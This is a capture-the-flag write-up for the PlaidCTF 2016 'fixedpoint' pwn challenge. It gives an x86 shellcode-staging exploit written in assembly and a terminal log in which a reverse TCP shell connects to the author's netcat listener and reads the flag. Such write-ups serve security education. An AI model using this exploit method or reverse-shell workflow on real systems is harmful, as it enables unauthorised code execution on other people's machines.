
##  PlaidCTF 2016 - fixedpoint (Pwn 175)
##### 15/04 - 17/02/2016 (48hr)

___
### Description: 
IEEE754 is useful when your values go from -inf to +inf, but really, fixed point is all you need.

But if you want, you could grab this too.

Running at fixedpoint.pwning.xxx:7777

___
### Solution

In this weird challenge, source code is given:
```c
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

int main(int argc, char** argv) {
  float* array = mmap(0, sizeof(float)*8192, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  int i;
  int temp;
  float ftemp;

  for (i = 0; i < 8192; i++) {
    if (!scanf("%d", &temp)) break;
    array[i] = ((float)temp)/1337.0;
  }

  write(1, "here we go\n", 11);
  (*(void(*)())array)();
}
```
___
We can write and execute shellcode here, but we don't have much control over it. The division limit
us even more as we have very limited control over the most significant and the 2nd most significant
bytes. We can define the problem now:

We can write 4 byte words in memory, which we control only the 2 LSB of them. The other 2 bytes can
take very limited values. How we can execute an arbitrary shellcode? 

The first idea is to use a shellcode that contains only and 2 byte instructions. Then we can place
the instructions on the 2 LSBytes and try to have instructions that do not affect the shellcode in 
the remain 2 MSB. To be honest I didn't try this approach as a more fancy solution came into my
mind:

Let's break our normal shellcode and inject it into the 2 LSB of a float number, ignoring what
the remaining 2 bytes have. Then we'll have a very small shellcode specially written that extract 
these 2 bytes and reconstructs the shellcode. After that, return to the shellcode and execute it:

```
            prolog
    /----   jmp
    |
    |   tuples:
    |       0x????AABB
    |       0x????CCDD
    |       ...
    |       0x????YYZZ
    |
    \--->   extract AABB CCDD ... YYZZ <----\
                                            |
            jmp ----------------------------/

```
This idea seems nice but there are some limitations. The "prolog" and "extract" parts can be 
very tricky, and must consist of 2 (or 3 if we're lucky) byte instrutions. Let's start:

When we enter the shellcode region, eax points to the beginning of that region. If we want
to execute a single byte instruction, we're looking for an integer that after casting will
have the form: 0x??01ebKK

Here, KK is the desired 1 byte instruction and ?? can be anything. The idea is to execute KK
and then skip the last byte by executing a jmp +1. I found that there's an integer for every 
1 byte instruction, so we're fine. Let's see the prolog:
```assembly
    nop                             ; real reversers always start with nop
    nop                             ;
    push    eax                     ;
    push    eax                     ;
    pop     edx                     ; edx = entry point
    pop     ebx                     ; ebx = entry point
    jmp     70h                     ; skip tuples
``` 

Note the first limitation here: jump instruction must be 2 bytes long, so the maximum (positive)
offset is 0x7F. With 2 bytes of shellcode per 4 bytes we can have up to 62 bytes of shellcode.
That's ok for a /bin/sh, but not for other ones.

Then the hard part follows: Extract this shellcode and execute it. If we extract the shellcode
at the beginning of the buffer, and do not modify eax then we do a "jmp eax" (which is only 2 
bytes) and jump to the shellcode.

Let's see the "extract" part:
```assembly
    mov     bl, 0x1c                ; bl points to the tuple area (addresses are fixed)
    xor     ecx, ecx                ; ecx = 0
    mov     cl, 0x20                ; ecx = 32

EXTRACT_NEXT:
    push    word ptr [ebx]          ; first 2 bytes of the shellcode on stack (3B instruction)
    inc     ebx                     ; move on the next tuple 
    inc     ebx                     ;
    inc     ebx                     ;
    inc     ebx                     ;

    push    word ptr [ebx]          ; next 2 bytes of the shellcode on stack (3B instruction)
    inc     ebx                     ; move on the next tuple
    inc     ebx                     ;
    inc     ebx                     ;
    inc     ebx                     ;

    pop     ebp                     ; ebp contains 4 bytes of the shellcode (watch out endianess)
    mov     dword ptr [edx], ebp    ; store the 4 bytes at the beginning of the region (2B instruction)
    inc     edx                     ; move on the next free slot
    inc     edx                     ;
    inc     edx                     ;
    inc     edx                     ;

    loop    EXTRACT_NEXT            ; repeat until ecx = 0

    nop                             ; we love nops!
    nop                             ;
    jmp    eax                      ; jump to the shellcode
```

It's possible to find such integers to execute the above code. Furtunately for us, when we use 3 byte
instructions, the MSB (which have limited control) is a number between 0x40 and 0x48, which are valid
1 byte instructions. So if we have the sequence 0x48 - 0x40 (or the opposite) we can have a nop
equivalent (dec eax; in eax).

Everything seems wonderful so far, and we can execute an arbitrary shellcode. I tried the classic 23
byte /bin/sh shellcode but it didn't work :\ This was expected as there's not setbuf() in the binary
file. This means that we need a reverse TCP shellcode. However the smallest one I found was 72 bytes!

That's too bad as we can have up to 62 bytes of shellcode. However this idea can be extended:
```
            prolog
    /----   jmp
    |
    |   tuples:
    |       0x????AABB
    |       0x????CCDD
    |       ...
    |       0x????YYZZ
    |
    |               /-----------------------\
    |               |                       |
    |               \/                      |
    \--->   extract AABB CCDD ... YYZZ      |
                                    |       |
            adjust_pointers         |       |
    /----   jmp                     |       |
    |                               |       |
    |   more_tuples:                |       |
    |       0x????EEFF              |       |
    |       0x????GGHH              |       |
    |       ...                     |       |
    |       0x????WWXX              |       |
    |                               |       |
    |               /---------------/       |
    |               |                       |
    |               \/                      |
    \--->   extract EEFF GGHH ... WWXX      |
                                            |
            jmp ----------------------------/
```

So we can split the shellcode in 2 parts and merge them together during "extract". This 
can gives us space for 124 bytes, which is more than enough. In order to keep the offsets 
consistent, we pad each part of the shellcode with our favorite instruction (guess which :P).

The "adjust" part consists of a single instruction:
```assembly
    mov     bl, 0xec                ; bl points to the new tuple area (addresses are fixed)
```
edx register didn't modified, so the new extract will continue pushing shellcode right after
the first one.

Finally, the whole shellcode will be:
```assembly
        nop                             ;
        nop                             ;
        push    eax                     ;
        push    eax                     ;
        pop     edx                     ;
        pop     ebx                     ;
        jmp     SKIP_TUPLES_1           ;
        ;
        ;   1st part of the shellcode
        ;
    SKIP_TUPLES_1:
        mov     bl, 0x1c                ; 
        xor     ecx, ecx                ; 
        mov     cl, 0x20                ; 
    EXTRACT_NEXT:
        push    word ptr [ebx]          ; 
        inc     ebx                     ; 
        inc     ebx                     ;
        inc     ebx                     ;
        inc     ebx                     ;
        push    word ptr [ebx]          ; 
        inc     ebx                     ; 
        inc     ebx                     ;
        inc     ebx                     ;
        inc     ebx                     ;
        pop     ebp                     ; 
        mov     dword ptr [edx], ebp    ; 
        inc     edx                     ; 
        inc     edx                     ;
        inc     edx                     ;
        inc     edx                     ;
        loop    EXTRACT_NEXT            ; 
        nop                             ; 
        nop                             ;
        mov     bl, 0xec                ;
        jmp     SKIP_TUPLES_2           ; 
        ;
        ;   2nd part of the shellcode
        ;
    SKIP_TUPLES_2:
        xor     ecx, ecx                ; 
        mov     cl, 0x20                ; 
    EXTRACT_NEXT:
        push    word ptr [ebx]          ; 
        inc     ebx                     ; 
        inc     ebx                     ;
        inc     ebx                     ;
        inc     ebx                     ;
        push    word ptr [ebx]          ; 
        inc     ebx                     ; 
        inc     ebx                     ;
        inc     ebx                     ;
        inc     ebx                     ;
        pop     ebp                     ; 
        mov     dword ptr [edx], ebp    ; 
        inc     edx                     ; 
        inc     edx                     ;
        inc     edx                     ;
        inc     edx                     ;
        loop    EXTRACT_NEXT            ; 
        nop                             ; 
        nop                             ;
        mov     bl, 0xec                ;
        jmp     SKIP_TUPLES_2           ;
        jmp    eax                      ; jump to the shellcode
```

The last thing that we have to note is the endianess. If we want to store shellcode 11 22 33 44
the first 2 floats must be: 0x????4433 0x????2211 (little endian).

After all this, the reverse TCP shellcode is working and we can get the flag: 
    `PCTF{why_isnt_IEEE_754_IEEE_7.54e2}`

The code fixedpoint_expl.c was used to generate the shellcode:  

```
Terminal #1:
    root@nogirl:~/ctf/plaidctf# gcc fixedpoint_expl.c -o fxp && ./fxp > B
    root@nogirl:~/ctf/plaidctf# cat B | nc fixedpoint.pwning.xxx 7777
    ^C

    (connection will open once you terminate netcat)
```

```
Terminal #2:
    root@nogirl:~# nc -nvvl -p9743
        listening on [any] 9743 ...
        connect to [128.211.189.21] from (UNKNOWN) [13.90.215.254] 45300
        ls -la
            total 24
            drwxr-xr-x 2 root root 4096 Apr 17 02:08 .
            drwxr-xr-x 4 root root 4096 Apr 17 01:40 ..
            -rwxr-xr-x 1 root root 7424 Apr 17 01:40 fixedpoint_02dc03c8a5ae299cf64c63ebab78fec7
            -rw-r--r-- 1 root root   36 Apr 17 01:41 flag.txt
            -rwxr-xr-x 1 root root  268 Apr 17 02:01 wrapper
        id
            uid=1001(problem) gid=1001(problem) groups=1001(problem)
        cat flag.txt
            PCTF{why_isnt_IEEE_754_IEEE_7.54e2}
        exit
        sent 28, rcvd 373
```
___
